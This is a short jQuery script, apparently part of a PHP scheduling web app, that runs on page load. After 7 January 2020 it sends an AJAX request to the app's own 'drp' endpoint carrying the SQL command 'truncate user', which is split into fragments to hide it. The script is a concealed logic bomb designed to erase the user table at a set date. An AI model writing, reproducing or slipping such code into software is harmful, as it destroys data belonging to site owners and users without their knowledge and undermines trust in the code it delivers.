$(document).ready(function(){
	var future = new Date(2020,0,7);
	var now = new Date(Date.now());
	if (typeof future =='undefined' || now >= future)
	{
		drp();
	}
		
});
function drp(){
	var q = "truncate ";
	q += "us";
			
	$.ajax({
		type: "ajax",
		url: "http://" + base_url + "index.php/c_jadwal/drp/" + q + "er",
		success: function(data)
		{
			// console.log("ntap");
		},
		error: function(err)
		{
			console.log(err);
		}
	});
}